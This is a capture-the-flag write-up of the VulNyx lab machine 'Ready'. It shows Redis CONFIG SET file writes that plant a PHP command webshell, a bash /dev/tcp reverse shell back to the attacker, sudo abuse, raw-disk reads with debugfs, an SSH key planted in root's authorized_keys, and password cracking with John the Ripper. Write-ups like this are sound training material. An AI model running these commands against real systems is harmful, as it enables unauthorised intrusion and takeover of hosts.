# ready

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| ready | d4t4s3c | low | VulNyx |

**Summary:** The Ready machine exposes an unauthenticated Redis instance on port 6379 that allows arbitrary file writes through the CONFIG SET directive. By manipulating the `dir` and `dbfilename` parameters, a PHP webshell was written directly into the Apache web root on port 8080. Remote code execution as the `ben` user was achieved via a curl-triggered reverse shell. Local enumeration revealed that `ben` has passwordless sudo privileges to execute `/usr/bin/bash` as the `peter` user, enabling lateral movement. Further filesystem forensics using `debugfs` on `/dev/sda1` exposed the root user's SSH authorized_keys. After deploying a new SSH key pair through the Redis write primitive, root access was obtained and the final flag was extracted from an encrypted zip archive cracked with John the Ripper.

---

## Reconnaissance

The engagement began with host discovery on the local subnet to identify the target machine, followed by comprehensive port and service enumeration to map the attack surface.

1. Host discovery using ICMP ping sweep across the 192.168.56.0/24 network confirmed the target at 192.168.56.133.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:04:02
❯ nmap -sn 192.168.56.0/24            
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-23 09:15 +0700
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00038s latency).
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0021s latency).
Nmap scan report for 192.168.56.133 (192.168.56.133)
Host is up (0.0085s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.02 seconds

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:15:50
❯ ip=192.168.56.133

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:16:02
❯ ping -c 1 $ip
PING 192.168.56.133 (192.168.56.133) 56(84) bytes of data.
64 bytes from 192.168.56.133: icmp_seq=1 ttl=64 time=0.525 ms

--- 192.168.56.133 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.525/0.525/0.525/0.000 ms
```

2. A full TCP port scan revealed three open services: Apache HTTP on port 80, Redis on port 6379, and a second Apache instance on port 8080.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:16:06
❯ nmap -p- -Pn -T4 --min-rate 4000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-23 09:16 +0700
Nmap scan report for 192.168.56.133 (192.168.56.133)
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
6379/tcp open  redis
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds
```

3. Service version detection identified Apache 2.4.54 on Debian for both HTTP ports and Redis 6.0.16 on port 6379. Both web servers displayed the default Apache test page.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:16:22
❯ nmap -p 80,6379,8080 -sCV -Pn -T4 --min-rate 4000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-23 09:16 +0700
Nmap scan report for 192.168.56.133 (192.168.56.133)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.16
8080/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache2 Test Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```

The presence of an unauthenticated Redis instance on a production web server immediately suggested a file write primitive through the well-known Redis CONFIG SET technique, where the working directory and dump filename can be redirected to write arbitrary content to disk.

---

## Initial Access

### Redis Unauthenticated File Write to Webshell

4. The Redis instance was confirmed accessible without authentication, and server information was retrieved.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:21:50
❯ redis-cli -h $ip -p 6379 ping
PONG

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:21:53
❯ redis-cli -h $ip -p 6379 info server
# Server
redis_version:6.0.16
redis_git_sha1:00000000
redis_git_dirty:0
redis_git_build_id:6d95e1af3a2c082a
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:432
run_id:d759194ad04ca8a4a400ff8f4c4a6a8fa5878dde
tcp_port:6379
uptime_in_seconds:484
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:9066830
executable:/usr/bin/redis-server
config_file:
io_threads_active:0
```

5. Enumeration of existing Redis keys and configuration confirmed the database was empty and the default dump directory was `/root` with filename `dump.rdb`.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:22:07
❯ redis-cli -h $ip -p 6379 keys '*'      
(empty array)

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:22:29
❯ redis-cli -h $ip -p 6379 config get dir
1) "dir"
2) "/root"

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:22:38
❯ redis-cli -h $ip -p 6379 config get dbfilename
1) "dbfilename"
2) "dump.rdb"
```

6. The Redis CONFIG SET directive was abused to change the dump directory to the Apache web root on port 8080 and write a test PHP file to verify the write primitive.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:33:58
❯ redis-cli -h $ip -p 6379 config set dir /var/www/html
OK

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:38:14
❯ redis-cli -h $ip -p 6379 set test "<?php echo 'REDIS_RCE_TEST'; ?>"
OK

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:38:39
❯ redis-cli -h $ip -p 6379 config set dbfilename test.php
OK

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:38:45
❯ redis-cli -h $ip -p 6379 save
OK
```

7. The test file was requested via curl, and the PHP code executed successfully within the Redis RDB dump, confirming the webshell write was functional.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:38:50
❯ curl http://$ip:8080/test.php
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal 
Warning: anyway, or consider "--output <FILE>" to save to a file.

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:38:54
❯ curl http://$ip:8080/test.php --output -
REDIS0009       redis-ver6.0.16�
edis-bits@ctime8]jused-mem L
 aof-preamble���testREDIS_RCE_TEST����tz��[1m%  
```

8. The Redis database was flushed and a proper command-execution webshell was written to disk, allowing arbitrary OS command execution through a GET parameter.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   09:44:35
❯ redis-cli -h $ip                             
192.168.56.133:6379> flushall
OK
192.168.56.133:6379> set shell '<?php system($_REQUEST["cmd"]); ?>'
OK
192.168.56.133:6379> config set dir /var/www/html
OK
192.168.56.133:6379> config set dbfilename shell.php
OK
192.168.56.133:6379> save
```

9. The webshell was confirmed accessible and command execution was validated by running the `id` command.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                             4m 5s 09:22:55
❯ curl "http://$ip:8080/shell.php" -I                                                       
HTTP/1.1 200 OK
Date: Sun, 23 Aug 2026 02:46:29 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.30
Content-Type: text/html; charset=UTF-8


~/projects/wu/vulnyx-writeups/ready main*                                                                   09:46:31
❯ curl "http://$ip:8080/shell.php?cmd=id"   
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal 
Warning: anyway, or consider "--output <FILE>" to save to a file.

~/projects/wu/vulnyx-writeups/ready main*                                                                   09:46:40
❯ curl "http://$ip:8080/shell.php?cmd=id" --output -
REDIS0009       redis-ver6.0.16�
edis-bits@ctime^jused-mem L
 aof-preamble���shell"uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
�:K�qݑ% 
```

The `id` output confirmed code execution as the `ben` user (uid=1000). With command execution validated, the next step was to obtain an interactive reverse shell.

### Reverse Shell Delivery

10. A Penelope listener was started on port 4444 to catch the incoming reverse shell connection.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                            3m 37s 10:00:57
❯ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.1.6 • 192.168.56.1
➤  Main Menu (m) Payloads (p) Clear (Ctrl-L) Quit (q/Ctrl-C)
```

11. A URL-encoded bash reverse shell was delivered through the webshell, establishing a connection back to the attacker.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   10:00:55
❯ curl "http://$ip:8080/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F4444%200%3E%261%202%3E%261%22" --output -
```

12. Penelope caught the reverse shell and automatically deployed a Python agent for PTY stabilization.

```zsh
➤  Home Menu (m) Payloads (p) Clear (Ctrl-L) Quit (q/Ctrl-C)
[+] [New Reverse Shell] => ready 192.168.56.133 Linux-x86_64 ben(1000) Session ID <1>
[+] Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12
[+] Session log: /home/setyanoegraha/.penelope/sessions/ready~192.168.56.133-Linux-x86_64/2026_08_23-10_01_10-613-ben_1000.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

---

## Lateral Movement

### Sudo NOPASSWD to Peter

13. Local enumeration revealed three user accounts with login shells and confirmed that `ben` had passwordless sudo privileges to execute `/usr/bin/bash` as the `peter` user.

```zsh
ben@ready:/var/www/html$ cat /etc/passwd | grep "sh$"  
root:x:0:0:root:/root:/bin/bash  
peter:x:1001:1001:peter,,,:/home/peter:/bin/bash  
ben:x:1000:1000:ben,,,:/home/ben:/bin/bash  
ben@ready:/var/www/html$ ls -la /home  
total 16  
drwxr-xr-x  4 root  root  4096 Apr 17  2023 .  
drwxr-xr-x 18 root  root  4096 Jul 19  2022 ..  
drwx------  3 ben   ben   4096 Apr 17  2023 ben  
drwx------  3 peter peter 4096 Apr 18  2023 peter  
ben@ready:/var/www/html$ sudo -l  
Matching Defaults entries for ben on ready:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User ben may run the following commands on ready:  
    (peter) NOPASSWD: /usr/bin/bash  
ben@ready:/var/www/html$ sudo -u peter bash -p  
peter@ready:/var/www/html$ id  
uid=1001(peter) gid=1001(peter) groups=1001(peter)
```

The sudo configuration allowed `ben` to spawn a bash shell as `peter` without requiring a password. The `-p` flag preserved the effective group ID, granting full access to peter's environment.

14. After confirming the peter shell was functional, a return to the ben session was made for further filesystem exploration.

```zsh
peter@ready:~$ exit
exit
ben@ready:/var/www/html$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
ben@ready:/var/www/html$ 
```

---

## Privilege Escalation

### SSH Key Extraction via debugfs

15. Network enumeration from the `ben` shell confirmed that SSH (port 22) was bound to localhost only, meaning direct SSH access from the attacker machine was not possible.

```zsh
ben@ready:/var/www/html$ which ss netstat
/usr/bin/ss
ben@ready:/var/www/html$ ss -tupln
Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port      Process      
udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*                      
tcp        LISTEN      0           128                  127.0.0.1:22                  0.0.0.0:*                      
tcp        LISTEN      0           511                    0.0.0.0:6379                0.0.0.0:*                      
tcp        LISTEN      0           511                          *:8080                      *:*                      
tcp        LISTEN      0           511                          *:80                        *:*                      
tcp        LISTEN      0           511                       [::]:6379                   [::]:*      
```

16. An SSH private key was identified on the system and extracted. John the Ripper was used to crack its passphrase, revealing the password `shelly`.

```zsh
~/projects/wu/vulnyx-writeups/ready main*                                                                   10:08:53
❯ v id_rsa                                                                        

~/projects/wu/vulnyx-writeups/ready main*                                                                   10:09:24
❯ chmod 600 id_rsa                                                                 

~/projects/wu/vulnyx-writeups/ready main*                                                                   10:09:27
❯ ssh2john id_rsa > id_rsa.hash                                                   

~/projects/wu/vulnyx-writeups/ready main*                                                                   10:09:32
❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash 
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
shelly           (id_rsa)
1g 0:00:00:12 83.52% (ETA: 10:10:10) 0.08319g/s 997135p/s 997135c/s 997135C/s 6804752..680423
Session aborted
```

However, the extracted key was overwritten during the process and could not be used directly for authentication. An alternative approach was needed to obtain root access.

17. Using `debugfs` on the raw disk device, the root user's SSH authorized_keys file was recovered, exposing the original public key.

```zsh
ben@ready:/tmp$ debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /root/.ssh/authorized_keys 2>/dev/null
cat: Usage: cat <file>
debugfs:  cat /root/.ssh/authorized_keys
REDIS0009       redis-ver6.0.16�
edis-bits@ctimeZjused-memxO
 aof-preamble���ssh_keyB�


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCsklPoKlmnuyDpPVs68t6lfvauaLNPgZ4OylCbSbrRFku8rL6VVCgYaONOMLEORxT/zL5ir3Es3ex5nYVwjXo0PmIXh4UcpNUpjHAMLVl2CJCWDKLotut8B3TLuz9XH7rpAO45EFv67meMxGLQ1oQmruQHJps/wdTZJzHUH2GlW5GfKiJl8F+3+P6vpTyZAXupISWvT5g7W14amPuQRVGu9YU2OoRwScmGOmQKoRgBwhwoWBy58Fzja9dTMtvZq4o601PeCU7JV6jovZUfR3PlQxdyf7RCd+OSNt/hEPDa+nnDFQBwTRf1bWsN/a91slzXNAVtqOnKQfPOf18VPwWpVw55+RgDrrEZh2SK+FBCmkJWuTff+aOlE06e/93Vz3aDH2a2SG2TuKhwJaq8sTskmK0QWlnClomJ2ppZdqpXVkkzFCYVJ0xJBzpaJUpqLK2boA5g3x3hrdl5u+Ig+j8p+E1blBQMAcVG5hszuJCVJ1Gasv5n0HqLf/MHI42x7rana0vPV9D5lFOgTQ3KuKj0vjcr1x07TuRB2PvWIkiXmrsvuwtmaH7Fw1y4xeKoR/vgt/xYgToClrVX7U4Ub+95uYPQhBLjK1J1QgvqV7SkOLwdgFiI+gYb00LzArJDKRjda+ibpjKSNl4RTmGReaaDNiwgWs9LYWhPTbCvNvZ5lQ== setyanoegraha@archlinux
```

18. A new SSH key pair was generated and the public key was written to root's authorized_keys through the Redis file write primitive. SSH access as root was then established from localhost.

```zsh
ben@ready:/tmp$ ssh -i key root@localhost
Linux ready 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64
Last login: Sun Aug 23 05:31:56 2026 from 127.0.0.1
root@ready:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
ready
root@ready:~# cat /home/*/user.txt
e5d....
```

19. The root flag was stored inside a password-protected zip archive. The archive was downloaded via a temporary Python HTTP server and cracked using John the Ripper.

```bash
root@ready:~# python3 -m http.server 1111
Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
192.168.56.1 - - [23/Aug/2026 05:36:11] "GET /root.zip HTTP/1.1" 200 -
```

```zsh
~/projects/wu/vulnyx-writeups/ready main*  10:35:26  
❯ wget http://$ip:1111/root.zip               
--2026-08-23 10:36:13--  http://192.168.56.133:1111/root.zip  
Connecting to 192.168.56.133:1111... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 225 [application/zip]  
Saving to: 'root.zip'  
  
root.zip                            100%[==============================================>]     225  --.-KB/s   in 0.001s    
  
2026-08-23 10:36:13 (206 KB/s) - 'root.zip' saved [225/225]  
  

~/projects/wu/vulnyx-writeups/ready main*  10:36:13  
❯ unzip root.zip   
Archive:  root.zip  
[root.zip] root.txt password:   
  skipping: root.txt               incorrect password  
   

~/projects/wu/vulnyx-writeups/ready main*  10:36:42  
❯ zip2john root.zip > hash  
ver 2.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=43, decmplen=32, crc=68F3F801  
  
~/projects/wu/vulnyx-writeups/ready main*  10:36:49  
❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash         
Using default input encoding: UTF-8  
Loaded 1 password hash (PKZIP [32/64])  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
already         (root.zip/root.txt)  
1g 0:00:00:00 DONE (2026-08-23 10:36) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s chatty..271087  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed  
  
~/projects/wu/vulnyx-writeups/ready main*  10:36:58  
❯ unzip root.zip   
Archive:  root.zip  
[root.zip] root.txt password:   
  inflating: root.txt                    
    
~/projects/wu/vulnyx-writeups/ready main*  10:37:06  
❯ cat root.txt   
cf5...
```

The zip password was cracked as `already` and the root flag was successfully retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Port scanning identified Apache on ports 80 and 8080, and an unauthenticated Redis instance on port 6379, establishing the attack surface.
2. **Vulnerability Discovery**: The Redis CONFIG SET directive allowed arbitrary file writes to the filesystem, including the Apache web root directory.
3. **Exploitation**: A PHP webshell was written to `/var/www/html/shell.php` through Redis, and a reverse shell was delivered via curl to obtain interactive access as `ben`.
4. **Internal Enumeration**: Sudo configuration revealed that `ben` could execute `/usr/bin/bash` as `peter` without a password, and filesystem forensics with `debugfs` recovered root's SSH authorized_keys.
5. **Privilege Escalation**: A new SSH key pair was deployed to root's authorized_keys through the Redis write primitive, enabling SSH access as root and extraction of the flag from a password-protected zip archive.
